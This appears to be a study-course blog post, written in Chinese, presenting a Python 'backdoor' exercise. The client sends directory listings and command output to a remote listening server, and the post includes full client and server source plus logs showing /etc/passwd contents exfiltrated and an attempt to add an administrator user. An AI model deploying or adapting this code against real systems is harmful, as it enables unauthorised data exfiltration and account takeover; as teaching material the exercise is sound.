---
layout: post
title: "Backdoor - Exercise"
date: "2021-10-23"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Penetration Testing Prerequisites
    - Python
---
# Backdoor - Exercise

## 功能

实现思路：客户端获取本地的系统信息和文件夹内容，然后将结果发送到服务器。

客户端client.py向服务器server.py发送以下信息：

1. 获取指定目录下条目的名字和类型（文件、文件夹、符号链接）。

2. 执行系统命令。

3. 退出。

   

## 环境

Python 3.9



## 使用说明

目前仅客户端client.py仅支持Windows和Linux平台，服务器server.py不限平台。

先运行服务器server.py，对指定端口进行监听：

```shell
python3 server.py
[INFO] listening on  27015 ...
```

可以修改server.py中监听的端口号：

```python
def main() -> int:
    HOST = ''    # Symbolic name meaning all available interfaces
    PORT = 27015    # Arbitrary non-privileged port
```

然后运行客户端client.py，指定要连接的远程服务器的IP地址和端口（注意：客户端可以看到底层平台信息）：

```shell
python3 client.py 
[INFO] The underlying platform of the client is: Linux-5.10.0-kali9-amd64-x86_64-with-glibc2.32
[INPUT] The remote host: 192.168.248.157
[INPUT] The same port as used by the server(Integer): 27015
```

连接成功，在服务器可以看到已连接的客户端的IP和端口。

```shell
python server.py
[INFO] listening on  27015 ...
[INFO] Connected by ('192.168.248.129', 36598)
```

在客户端选择**1**：获取指定目录下条目的名字和类型，并输入`/opt`。

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
1
[INPUT] Please enter the path of the folder where the content needs to be obtained: /opt
[INFO] The following entries in the directory /opt have been sent: 
[['burpsuite_community_v1.7.36.jar'], ['exfiltration', 'webshell_management', 'IDE', 'sqlmap_post', 'microsoft', 'socialengineering', 'pycharm-2021.2.3', 'clion-2021.2.2', 'pycharm-2021.2.2', 'xray', 'bruteforce'], [], ['/opt'], ['Linux-5.10.0-kali9-amd64-x86_64-with-glibc2.32']]
```

服务器可以接收到客户端主机的`/opt`目录下的文件、文件夹、符号链接的名字。

```shell
[INFO] The entries in the directory given by /opt:
[INFO] Files:  ['burpsuite_community_v1.7.36.jar']
[INFO] Folders:  ['exfiltration', 'webshell_management', 'IDE', 'sqlmap_post', 'microsoft', 'socialengineering', 'pycharm-2021.2.3', 'clion-2021.2.2', 'pycharm-2021.2.2', 'xray', 'bruteforce']
[INFO] Symlinks:  []
```

如果用户输入一个文件名`/etc/passwd`，而不是一个目录。那么客户端不会向服务器发送任何数据，并且会提示`/etc/passwd`不是一个有效目录。

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
1
[INPUT] Please enter the path of the folder where the content needs to be obtained: /etc/passwd
[ERROR] /etc/passwd is not a validate directory! No data has been sent to the server.
```

同理，如果用户输入一个不存在目录`/idontexist`，客户端也不会向服务器发送任何数据，并且会提示`/idontexist`不是一个有效目录。

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
1
[INPUT] Please enter the path of the folder where the content needs to be obtained: /idontexist
[ERROR] /idontexist is not a validate directory! No data has been sent to the server.
```

在客户端选择**2**：执行系统命令，并输入`whoami`。

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): whoami
```

客户端不会显示任何信息，但是whoami的执行结果已经被发送到了服务器。

```shell
[INFO] The result of execute command 'whoami'
[STDOUT]
root

[STDERR]
```

如果权限足够，可以在客户端查看`/etc/passwd`、`/etc/shadow`等敏感文件，或者添加管理员用户：

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): cat /etc/passwd
```

在服务端可以看到执行命令的标准输出和标准错误：

```shell
[INFO] The result of execute command 'cat /etc/passwd'
[STDOUT] 
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
redis:x:134:143::/var/lib/redis:/usr/sbin/nologin
vs:x:1001:1001::/home/vs:/bin/bash

[STDERR] 

```

当客户端因权限不够而导致命令执行失败时，

```shell
[INPUT] The system command to execute(e.g. whoami /all): whoami
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): net user pentestuser pentestpass /add
[ERROR] 'net user pentestuser pentestpass /add' execution failed with subprocess.CalledProcessError status: 2
```

服务器也可以看到对应的标准错误

```shell
[INFO] The result of execute command 'whoami'
[STDOUT] 
desktop-7gplat6\nawkham

[STDERR] 

[INFO] The result of execute command 'net user pentestuser pentestpass /add'
[STDOUT] 

[STDERR] 
发生系统错误 5。

拒绝访问。
```

**注意：**目前客户端在Windows平台下存在无法用type命令读取文件内容的问题，会抛出socket.error。而客户端在Linux下未发现相关问题。

客户端(Windows)：

```shell
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): type C:\\passwd.txt
[ERROR] socket failed with error, please run the server script first, then check if the server address or port is right.

Process finished with exit code 0
```

服务器：

```shell
[INFO] The client has closed the connection. Please restart the server script, then restart the client script.
```



## 完整示例

**服务器**

```shell
"C:\Users\Nawkham\PycharmProjects\Scripting for Pentesters1\venv\Scripts\python.exe" "C:/Users/Nawkham/PycharmProjects/Scripting for Pentesters1/main.py"
[INFO] listening on  27015 ...
[INFO] Connected by ('192.168.248.129', 36596)
[INFO] The underlying platform of the client is: Linux-5.10.0-kali9-amd64-x86_64-with-glibc2.32

[INFO] The entries in the directory given by /etc: 
[INFO] Files:  ['nsswitch.conf', 'wgetrc', 'adjtime', 'timezone']
[INFO] Folders:  ['vpnc', 'rc2.d', 'gtk-2.0', 'localtime', 'rmt']
[INFO] Symlinks:  ['mtab', 'os-release', 'localtime', 'rmt']

[INFO] The result of execute command 'whoami'
[STDOUT] 
root

[STDERR] 

[INFO] The result of execute command 'ls /etc'
[STDOUT] 
adduser.conf
adjtime
alsa
xattr.conf
xdg
xfce4
xl2tpd
zsh
zsh_command_not_found

[STDERR] 

[INFO] The result of execute command 'cat /etc/passwd'
[STDOUT] 
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
redis:x:134:143::/var/lib/redis:/usr/sbin/nologin
vs:x:1001:1001::/home/vs:/bin/bash

[STDERR] 

[INFO] The client has closed the connection. Please restart the server script, then restart the client script.

Process finished with exit code 0

```

**客户端：**

```shell
"/root/PycharmProjects/Scripting for Pentesters /venv/bin/python" "/root/PycharmProjects/Scripting for Pentesters /main.py"
[INFO] The underlying platform of the client is: Linux-5.10.0-kali9-amd64-x86_64-with-glibc2.32
[INPUT] The remote host: 192.168.248.157
[INPUT] The same port as used by the server(Integer): 27015
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
1
[INPUT] Please enter the path of the folder where the content needs to be obtained: /etc
[INFO] The following entries in the directory /etc have been sent: 
[['nsswitch.conf', 'wgetrc', 'adjtime', 'timezone'], ['vpnc', 'rc2.d', 'gtk-2.0', 'localtime', 'rmt'], ['mtab', 'os-release', 'localtime', 'rmt'], ['/etc'], ['Linux-5.10.0-kali9-amd64-x86_64-with-glibc2.32']]
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
1
[INPUT] Please enter the path of the folder where the content needs to be obtained: /etc/passwd
[ERROR] /etc/passwd is not a validate directory! No data has been sent to the server.
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): whoami
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): ls /etc
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
2
[INPUT] The system command to execute(e.g. whoami /all): cat /etc/passwd
Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit
0

Process finished with exit code 0

```



## client.py源码

```python
import os
import platform
import socket
import pickle
import sys
import errno
import subprocess


def getdirentry(path):
    """ get the entries in the directory given by path. """
    entries = []
    files = []
    folders = []
    symlinks = []
    if os.path.isdir(path):
        with os.scandir(path) as it:
            for entry in it:
                if entry.is_file():
                    files.append(entry.name)
                if entry.is_dir():
                    folders.append(entry.name)
                if entry.is_symlink():
                    symlinks.append(entry.name)
            entries.append(files)
            entries.append(folders)
            entries.append(symlinks)
            return entries
    else:
        return errno.ENOTDIR


def execSystemcmd(cmd):
    """ Execute system commands """
    proc = subprocess.run(cmd, capture_output=True, text=True)
    result = [proc.stdout, proc.stderr, proc.args]
    try:
        proc.check_returncode()
        return result
    except subprocess.CalledProcessError:
        print("[ERROR] '{}' execution failed with subprocess.CalledProcessError status: {}".format(" ".join(proc.args), proc.returncode))
        return result


def printmenu():
    return("""Select an option
    1. Get the names and types of the entries in the directory given by path
    2. Execute system commands
    0. exit\n""")

def main() -> int:
    osinfo = platform.platform()
    print("[INFO] The underlying platform of the client is: {}".format(osinfo))
    HOST = input("[INPUT] The remote host: ")    # The remote host
    PORT = int(input("[INPUT] The same port as used by the server(Integer): "))                # The same port as used by the server

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            while True:
                if osinfo.startswith("Darwin"):
                    # macOS (darwin kernel)
                    pass
                elif osinfo.startswith("Windows"):
                    # MS platforms
                    option = int(input(printmenu()))
                    # Get the content in the specified directory and send it to the server
                    if option == 0:
                        exit(0)
                    if option == 1:
                        path = input("[INPUT] Please enter the path of the folder where the content needs to be obtained: ")
                        entries = getdirentry(path)
                        try:
                            if entries != errno.ENOTDIR:  # directory exists
                                pathlist = path.split()
                                osinfolist = osinfo.split()
                                entries.append(pathlist)
                                entries.append(osinfolist)
                                data = pickle.dumps(entries)
                                s.send(data)
                                print(
                                    "[INFO] The following entries in the directory {} have been sent: \n{}".format(path,
                                                                                                                   entries))
                            else:
                                print(
                                    "[ERROR] {} is not a validate directory! No data has been sent to the server.".format(
                                        path))
                                continue
                        except socket.error:
                            print(
                                "[ERROR] The server has closed the connection. Please restart the server script, then restart the client script.")
                            sys.exit(0)
                        else:  # directory doesn't exit
                            continue
                        pass
                    # Execute system commands and send the result to server
                    if option == 2:
                        cmd = input("[INPUT] The system command to execute(e.g. whoami /all): ")
                        cmdlist = cmd.split()
                        result = pickle.dumps(execSystemcmd(cmdlist))   # see the usage of subprocess.Popen : https://stackoverflow.com/questions/4514751/pipe-subprocess-standard-output-to-a-variable
                        s.send(result)


                elif osinfo.startswith("Linux"):
                    option = int(input(printmenu()))
                    # Get the content in the specified directory and send it to the server
                    if option == 0:
                        exit(0)
                    if option == 1:
                        path = input("[INPUT] Please enter the path of the folder where the content needs to be obtained: ")
                        entries = getdirentry(path)
                        try:
                            if entries != errno.ENOTDIR:  # directory exists
                                pathlist = path.split()
                                osinfolist = osinfo.split()
                                entries.append(pathlist)
                                entries.append(osinfolist)
                                data = pickle.dumps(entries)
                                s.send(data)
                                print(
                                    "[INFO] The following entries in the directory {} have been sent: \n{}".format(path,
                                                                                                                   entries))
                            else:
                                print(
                                    "[ERROR] {} is not a validate directory! No data has been sent to the server.".format(
                                        path))
                                continue
                        except socket.error:
                            print(
                                "[ERROR] The server has closed the connection. Please restart the server script, then restart the client script.")
                            sys.exit(0)
                        else:  # directory doesn't exit
                            continue
                        pass
                    # Execute system commands and send the result to server
                    if option == 2:
                        cmd = input("[INPUT] The system command to execute(e.g. whoami /all): ")
                        cmdlist = cmd.split()
                        result = pickle.dumps(execSystemcmd(cmdlist))   # see the usage of subprocess.Popen : https://stackoverflow.com/questions/4514751/pipe-subprocess-standard-output-to-a-variable
                        s.send(result)
                elif osinfo.startswith("Java"):
                    # Java platforms
                    pass
    except socket.error:
        print("[ERROR] socket failed with error, please run the server script first, then check if the server address or port is right.")
    finally:
        s.close()
    return 0


if __name__ == '__main__':
    sys.exit(main())
```



## server.py源码

```py
import socket
import pickle
import sys


def main() -> int:
    HOST = ''    # Symbolic name meaning all available interfaces
    PORT = 27015    # Arbitrary non-privileged port
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen(1)
            print("[INFO] listening on {} {} ...".format(HOST, PORT))
            conn, addr = s.accept()
            count = 0
            with conn:
                print('[INFO] Connected by', addr)
                while True:
                    raw = conn.recv(1048576)
                    try:
                        if raw:
                            data = pickle.loads(raw)
                            # Execute system commands
                            if len(data) == 3:
                                print("[INFO] The result of execute command '{}'".format(" ".join(data[2])))
                                print("[STDOUT] \n{}".format(data[0]))
                                print("[STDERR] \n{}".format(data[1]))

                            # Get the content in the specified directory
                            if len(data) == 5:
                                print("[INFO] The entries in the directory given by {}: ".format(''.join(data[3])))
                                print("[INFO] Files: ", data[0])
                                print("[INFO] Folders: ", data[1])
                                print("[INFO] Symlinks: ", data[2])
                                print()
                        else:
                            print("[INFO] The client has closed the connection. Please restart the server script, then restart the client script.")
                            break
                    except ValueError:
                        print("[ERROR] The client has sent invalidate data. Please use matched client to connect to server. Don't use netcat or ncat.")
                        sys.exit(0)
                    except pickle.UnpicklingError:
                        print("[ERROR] The client has sent invalidate data. Please use matched client to connect to server. Don't use netcat or ncat.")
                        sys.exit(0)

    except socket.error:
        print("[ERROR] Failed to initialize socket.")
    finally:
        s.close()


    return 0


if __name__ == '__main__':
    sys.exit(main())
```



## 源码仓库

[r3kind1e-Backdoor - Exercise](https://github.com/r3kind1e/INE/tree/main/CYBER%20SECURITY/Penetration%20Testing%20Student/Penetration%20Testing%20Preliminary%20Skills%20%26%20Programming/Pentester%20Scripting%20-%20Study%20Guide/Backdoor%20-%20Exercise)

